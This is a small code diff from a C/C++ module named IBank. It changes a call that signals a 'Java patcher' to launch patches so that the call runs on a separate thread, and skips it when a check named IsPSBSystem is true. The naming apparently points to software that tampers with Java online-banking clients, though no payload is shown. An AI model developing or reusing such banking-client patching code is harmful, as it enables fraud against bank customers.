@@ -280,7 +280,7 @@ namespace IBank
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
 			if (!IsPSBSystem())
-				JavaPatcherSignal();
+				StartThread( JavaPatcherSignal, 0 );
 		#endif
 
 
